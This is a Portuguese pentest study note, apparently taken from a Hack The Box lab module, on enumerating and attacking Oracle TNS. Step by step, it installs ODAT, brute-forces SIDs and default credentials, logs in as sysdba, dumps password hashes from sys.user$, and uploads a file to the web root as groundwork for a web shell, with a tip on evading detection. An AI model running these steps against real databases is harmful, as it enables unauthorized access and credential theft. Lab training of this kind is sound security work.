[[Redes - TNS]] [[Linux - TNS]]

Antes de podermos enumerar o ouvinte TNS e interagir com ele, precisamos baixar alguns pacotes e ferramentas para nossa `Pwnbox`instância, caso ela ainda não os tenha. Aqui está um script Bash que faz tudo isso:

#### Configuração do Oracle-Tools.sh
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

Depois disso, podemos tentar determinar se a instalação foi bem-sucedida executando o seguinte comando:

#### Testando ODAT
```sh
NycolasES6@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

Oracle Database Attacking Tool ( `ODAT`) é uma ferramenta de teste de penetração de código aberto escrita em Python e projetada para enumerar e explorar vulnerabilidades em bancos de dados Oracle.

 Ela pode ser usada para identificar e explorar várias falhas de segurança em bancos de dados Oracle, incluindo injeção de SQL, execução remota de código e escalonamento de privilégios.

Agora vamos usar `nmap`a porta padrão do listener Oracle TNS para escanear.

#### Nmap
```sh
NycolasES6@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Podemos ver que a porta está aberta e o serviço está em execução. No Oracle RDBMS, um System Identifier ( `SID`) é um nome exclusivo que identifica uma instância de banco de dados específica. Ele pode ter várias instâncias, cada uma com seu próprio System ID.

Uma instância é um conjunto de processos e estruturas de memória que interagem para gerenciar os dados do banco de dados. Quando um cliente se conecta a um banco de dados Oracle, ele especifica o banco de dados `SID` junto com sua string de conexão.

O cliente usa esse SID para identificar a qual instância de banco de dados ele deseja se conectar. Suponha que o cliente não especifique um SID. Então, o valor padrão definido no arquivo `tnsnames.ora` é usado.

Os SIDs são uma parte essencial do processo de conexão, pois identificam a instância específica do banco de dados ao qual o cliente deseja se conectar. Se o cliente especificar um SID incorreto, a tentativa de conexão falhará.

Os administradores de banco de dados podem usar o SID para monitorar e gerenciar as instâncias individuais de um banco de dados. Por exemplo, eles podem iniciar, parar ou reiniciar uma instância, ajustar sua alocação de memória ou outros parâmetros de configuração e monitorar seu desempenho usando ferramentas como o Oracle Enterprise Manager.

Existem várias maneiras de enumerar, ou melhor dizendo, adivinhar SIDs. Portanto, podemos usar ferramentas como `nmap`, `hydra`, `odat`, e outras. Vamos usar `nmap`primeiro.

#### Nmap - SID Bruteforcing
```sh
NycolasES6@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

Podemos usar a `odat.py`ferramenta para executar uma variedade de varreduras para enumerar e reunir informações sobre os serviços de banco de dados Oracle e seus componentes.

Essas varreduras podem recuperar nomes de banco de dados, versões, processos em execução, contas de usuário, vulnerabilidades, configurações incorretas, etc. Vamos usar a `all`opção e testar todos os módulos da `odat.py`ferramenta.
#### ODAT
```sh
NycolasES6@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

Neste exemplo, encontramos credenciais válidas para o usuário `scott`e sua senha `tiger`. Depois disso, podemos usar a ferramenta `sqlplus`para conectar ao banco de dados Oracle e interagir com ele.

#### SQLplus - Log In
```sh
NycolasES6@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Se você encontrar o seguinte erro `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, execute o comando abaixo, retirado [daqui](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared) .

```sh
NycolasES6@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Existem muitos [comandos SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que podemos usar para enumerar o banco de dados manualmente. Por exemplo, podemos listar todas as tabelas disponíveis no banco de dados atual ou nos mostrar os privilégios do usuário atual como o seguinte:

#### Oracle RDBMS - Interação
```sh
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Aqui, o usuário `scott`não tem privilégios administrativos, mas podemos tentar usar essa conta para fazer login como System Database Admin ( `sysdba`), nos dando privilégios mais altos. Isso é possível quando o usuário `scott`tem os privilégios apropriados, normalmente concedidos pelo administrador do banco de dados ou usados ​​pelo próprio administrador.

```sh
sqlplus scott/tiger@10.129.12.81/XE as sysdba
```

#### Oracle RDBMS - Enumeração de Banco de Dados
não podemos adicionar novos usuários ou fazer modificações. A partir deste ponto, poderíamos recuperar os hashes de senha do `sys.user$`e tentar quebrá-los offline. A consulta para isso seria semelhante à seguinte:

#### Oracle RDBMS - Extrair Hashes de Senha
```sh
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Outra opção é carregar um web shell para o alvo. No entanto, isso requer que o servidor execute um servidor web, e precisamos saber a localização exata do diretório raiz do servidor web.

| **SO**  | **Caminho**          |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

Tentar nossa abordagem de exploração com arquivos que não parecem perigosos para sistemas de detecção/prevenção de antivírus ou intrusão é sempre importante. Devemos criar um arquivo de texto com uma string e o usamos para fazer upload para o sistema.

#### Oracle RDBMS - Upload de arquivo
```sh
NycolasES6@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
NycolasES6@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Por fim, podemos testar se a abordagem de upload de arquivo funcionou com `curl`. Portanto, usaremos uma solicitação `GET http://<IP>` ou podemos visitar via navegador.

```shell-session
NycolasES6@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```

---
## Referências

https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

https://academy.hackthebox.com/module/112/section/2117





























